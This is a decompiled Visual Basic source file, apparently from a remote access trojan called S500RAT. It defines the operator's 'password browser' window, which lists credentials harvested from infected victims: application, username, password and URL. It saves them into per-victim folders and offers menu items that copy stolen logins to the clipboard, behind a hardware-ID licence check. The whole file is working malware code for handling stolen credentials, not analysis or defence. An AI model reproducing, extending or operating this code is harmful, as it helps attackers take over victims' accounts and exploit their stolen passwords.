Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.IO
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.My
Imports S500RAT.Server
Imports S500RAT.Server.Connection

Namespace S500RAT
	' Token: 0x0200003A RID: 58
	<DesignerGenerated()>
	Public Partial Class FormPasswordBrowser
		Inherits Form

		' Token: 0x06001023 RID: 4131 RVA: 0x0008B80F File Offset: 0x00089A0F
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.PasswordBrowser_Load
			AddHandler MyBase.Resize, AddressOf Me.PasswordBrowser_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000696 RID: 1686
		' (get) Token: 0x06001026 RID: 4134 RVA: 0x0008CBA6 File Offset: 0x0008ADA6
		' (set) Token: 0x06001027 RID: 4135 RVA: 0x0008CBB0 File Offset: 0x0008ADB0
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x17000697 RID: 1687
		' (get) Token: 0x06001028 RID: 4136 RVA: 0x0008CBB9 File Offset: 0x0008ADB9
		' (set) Token: 0x06001029 RID: 4137 RVA: 0x0008CBC3 File Offset: 0x0008ADC3
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000698 RID: 1688
		' (get) Token: 0x0600102A RID: 4138 RVA: 0x0008CBCC File Offset: 0x0008ADCC
		' (set) Token: 0x0600102B RID: 4139 RVA: 0x0008CBD6 File Offset: 0x0008ADD6
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000699 RID: 1689
		' (get) Token: 0x0600102C RID: 4140 RVA: 0x0008CBDF File Offset: 0x0008ADDF
		' (set) Token: 0x0600102D RID: 4141 RVA: 0x0008CBEC File Offset: 0x0008ADEC
		Friend Overridable Property CopyUser As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyUser
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyUser_Click
				Dim copyUser As ToolStripMenuItem = Me._CopyUser
				If copyUser IsNot Nothing Then
					RemoveHandler copyUser.Click, value2
				End If
				Me._CopyUser = value
				copyUser = Me._CopyUser
				If copyUser IsNot Nothing Then
					AddHandler copyUser.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700069A RID: 1690
		' (get) Token: 0x0600102E RID: 4142 RVA: 0x0008CC2F File Offset: 0x0008AE2F
		' (set) Token: 0x0600102F RID: 4143 RVA: 0x0008CC3C File Offset: 0x0008AE3C
		Friend Overridable Property CopyPassword As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyPassword
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyPassword_Click
				Dim copyPassword As ToolStripMenuItem = Me._CopyPassword
				If copyPassword IsNot Nothing Then
					RemoveHandler copyPassword.Click, value2
				End If
				Me._CopyPassword = value
				copyPassword = Me._CopyPassword
				If copyPassword IsNot Nothing Then
					AddHandler copyPassword.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700069B RID: 1691
		' (get) Token: 0x06001030 RID: 4144 RVA: 0x0008CC7F File Offset: 0x0008AE7F
		' (set) Token: 0x06001031 RID: 4145 RVA: 0x0008CC8C File Offset: 0x0008AE8C
		Friend Overridable Property CopyURL As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._CopyURL
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.CopyURL_Click
				Dim copyURL As ToolStripMenuItem = Me._CopyURL
				If copyURL IsNot Nothing Then
					RemoveHandler copyURL.Click, value2
				End If
				Me._CopyURL = value
				copyURL = Me._CopyURL
				If copyURL IsNot Nothing Then
					AddHandler copyURL.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700069C RID: 1692
		' (get) Token: 0x06001032 RID: 4146 RVA: 0x0008CCCF File Offset: 0x0008AECF
		' (set) Token: 0x06001033 RID: 4147 RVA: 0x0008CCD9 File Offset: 0x0008AED9
		Private Overridable Property ClientInfo As Label

		' Token: 0x1700069D RID: 1693
		' (get) Token: 0x06001034 RID: 4148 RVA: 0x0008CCE2 File Offset: 0x0008AEE2
		' (set) Token: 0x06001035 RID: 4149 RVA: 0x0008CCEC File Offset: 0x0008AEEC
		Private Overridable Property Label13 As Label

		' Token: 0x1700069E RID: 1694
		' (get) Token: 0x06001036 RID: 4150 RVA: 0x0008CCF5 File Offset: 0x0008AEF5
		' (set) Token: 0x06001037 RID: 4151 RVA: 0x0008CCFF File Offset: 0x0008AEFF
		Friend Overridable Property ListPass As Guna2DataGridView

		' Token: 0x1700069F RID: 1695
		' (get) Token: 0x06001038 RID: 4152 RVA: 0x0008CD08 File Offset: 0x0008AF08
		' (set) Token: 0x06001039 RID: 4153 RVA: 0x0008CD12 File Offset: 0x0008AF12
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x170006A0 RID: 1696
		' (get) Token: 0x0600103A RID: 4154 RVA: 0x0008CD1B File Offset: 0x0008AF1B
		' (set) Token: 0x0600103B RID: 4155 RVA: 0x0008CD25 File Offset: 0x0008AF25
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x170006A1 RID: 1697
		' (get) Token: 0x0600103C RID: 4156 RVA: 0x0008CD2E File Offset: 0x0008AF2E
		' (set) Token: 0x0600103D RID: 4157 RVA: 0x0008CD38 File Offset: 0x0008AF38
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x170006A2 RID: 1698
		' (get) Token: 0x0600103E RID: 4158 RVA: 0x0008CD41 File Offset: 0x0008AF41
		' (set) Token: 0x0600103F RID: 4159 RVA: 0x0008CD4B File Offset: 0x0008AF4B
		Friend Overridable Property Column2 As DataGridViewTextBoxColumn

		' Token: 0x170006A3 RID: 1699
		' (get) Token: 0x06001040 RID: 4160 RVA: 0x0008CD54 File Offset: 0x0008AF54
		' (set) Token: 0x06001041 RID: 4161 RVA: 0x0008CD5E File Offset: 0x0008AF5E
		Friend Overridable Property Column5 As DataGridViewTextBoxColumn

		' Token: 0x170006A4 RID: 1700
		' (get) Token: 0x06001042 RID: 4162 RVA: 0x0008CD67 File Offset: 0x0008AF67
		' (set) Token: 0x06001043 RID: 4163 RVA: 0x0008CD71 File Offset: 0x0008AF71
		Friend Overridable Property Column6 As DataGridViewTextBoxColumn

		' Token: 0x170006A5 RID: 1701
		' (get) Token: 0x06001044 RID: 4164 RVA: 0x0008CD7A File Offset: 0x0008AF7A
		' (set) Token: 0x06001045 RID: 4165 RVA: 0x0008CD84 File Offset: 0x0008AF84
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x170006A6 RID: 1702
		' (get) Token: 0x06001046 RID: 4166 RVA: 0x0008CDC7 File Offset: 0x0008AFC7
		' (set) Token: 0x06001047 RID: 4167 RVA: 0x0008CDD1 File Offset: 0x0008AFD1
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x170006A7 RID: 1703
		' (get) Token: 0x06001048 RID: 4168 RVA: 0x0008CDDA File Offset: 0x0008AFDA
		' (set) Token: 0x06001049 RID: 4169 RVA: 0x0008CDE4 File Offset: 0x0008AFE4
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x170006A8 RID: 1704
		' (get) Token: 0x0600104A RID: 4170 RVA: 0x0008CDED File Offset: 0x0008AFED
		' (set) Token: 0x0600104B RID: 4171 RVA: 0x0008CDF7 File Offset: 0x0008AFF7
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x170006A9 RID: 1705
		' (get) Token: 0x0600104C RID: 4172 RVA: 0x0008CE00 File Offset: 0x0008B000
		' (set) Token: 0x0600104D RID: 4173 RVA: 0x0008CE0A File Offset: 0x0008B00A
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x170006AA RID: 1706
		' (get) Token: 0x0600104E RID: 4174 RVA: 0x0008CE13 File Offset: 0x0008B013
		' (set) Token: 0x0600104F RID: 4175 RVA: 0x0008CE20 File Offset: 0x0008B020
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170006AB RID: 1707
		' (get) Token: 0x06001050 RID: 4176 RVA: 0x0008CE63 File Offset: 0x0008B063
		' (set) Token: 0x06001051 RID: 4177 RVA: 0x0008CE70 File Offset: 0x0008B070
		Friend Overridable Property ToolStripMenuItem1 As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._ToolStripMenuItem1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.ToolStripMenuItem1_Click
				Dim toolStripMenuItem As ToolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					RemoveHandler toolStripMenuItem.Click, value2
				End If
				Me._ToolStripMenuItem1 = value
				toolStripMenuItem = Me._ToolStripMenuItem1
				If toolStripMenuItem IsNot Nothing Then
					AddHandler toolStripMenuItem.Click, value2
				End If
			End Set
		End Property

		' Token: 0x170006AC RID: 1708
		' (get) Token: 0x06001052 RID: 4178 RVA: 0x0008CEB3 File Offset: 0x0008B0B3
		' (set) Token: 0x06001053 RID: 4179 RVA: 0x0008CEBD File Offset: 0x0008B0BD
		Public Property Client As Clients

		' Token: 0x170006AD RID: 1709
		' (get) Token: 0x06001054 RID: 4180 RVA: 0x0008CEC6 File Offset: 0x0008B0C6
		' (set) Token: 0x06001055 RID: 4181 RVA: 0x0008CED0 File Offset: 0x0008B0D0
		Public Property F As FormS500

		' Token: 0x170006AE RID: 1710
		' (get) Token: 0x06001056 RID: 4182 RVA: 0x0008CED9 File Offset: 0x0008B0D9
		' (set) Token: 0x06001057 RID: 4183 RVA: 0x0008CEE3 File Offset: 0x0008B0E3
		Public Property FullPath As String

		' Token: 0x170006AF RID: 1711
		' (get) Token: 0x06001058 RID: 4184 RVA: 0x0008CEEC File Offset: 0x0008B0EC
		' (set) Token: 0x06001059 RID: 4185 RVA: 0x0008CEF6 File Offset: 0x0008B0F6
		Friend Property ParentClient As Clients

		' Token: 0x0600105A RID: 4186 RVA: 0x0008CF00 File Offset: 0x0008B100
		Private Sub PasswordBrowser_Load(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Conversions.ToBoolean(Operators.NotObject(Operators.CompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)))
				If flag Then
					MyBase.Close()
				End If
				Dim flag2 As Boolean = Operators.ConditionalCompareObjectEqual(APIH.GetHWID(Conversions.ToString(FormSC.GetPicpass())), FormSC.GetPickey(), False)
				If flag2 Then
					Setting.Running = True
				Else
					MyBase.Close()
				End If
				Dim flag3 As Boolean = Not Setting.Running
				If flag3 Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
			Me.ListPass.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListPass.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListPass.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListPass.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListPass.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListPass.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListPass.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListPass.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListPass.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex2 As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Try
				Dim text As String = Path.Combine(Application.StartupPath, "Clients", "Passwords2\" + Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2)) + "\"
				Dim flag4 As Boolean = Not Directory.Exists(text)
				If flag4 Then
					Directory.CreateDirectory(text)
					Me.FullPath = text
				Else
					Me.FullPath = text
				End If
			Catch ex3 As Exception
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x0600105B RID: 4187 RVA: 0x0008D20C File Offset: 0x0008B40C
		Private Sub PasswordBrowser_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x0600105C RID: 4188 RVA: 0x0008D2A0 File Offset: 0x0008B4A0
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600105D RID: 4189 RVA: 0x0008D30C File Offset: 0x0008B50C
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x0600105E RID: 4190 RVA: 0x0008D324 File Offset: 0x0008B524
		Private Sub CopyUser_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPass.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPass.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(2).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x0600105F RID: 4191 RVA: 0x0008D3D0 File Offset: 0x0008B5D0
		Private Sub CopyPassword_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPass.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPass.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(3).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06001060 RID: 4192 RVA: 0x0008D47C File Offset: 0x0008B67C
		Private Sub CopyURL_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPass.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPass.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(dataGridViewRow.Cells(4).Value))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06001061 RID: 4193 RVA: 0x0008D528 File Offset: 0x0008B728
		Private Sub ToolStripMenuItem1_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.ListPass.Rows.Count > 0
			If flag Then
				Try
					For Each obj As Object In Me.ListPass.SelectedRows
						Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
						MyProject.Computer.Clipboard.SetText(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject("App : ", dataGridViewRow.Cells(1).Value), " | "), "User : "), dataGridViewRow.Cells(2).Value), " | "), "Password : "), dataGridViewRow.Cells(3).Value), " | "), "Uel : "), dataGridViewRow.Cells(4).Value)))
					Next
				Catch ex As Exception
					Console.WriteLine(ex.Message)
				End Try
			End If
		End Sub

		' Token: 0x06001062 RID: 4194 RVA: 0x0008D664 File Offset: 0x0008B864
		Private Sub Button1_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x04000757 RID: 1879
		Private FormSize As Boolean
	End Class
End Namespace
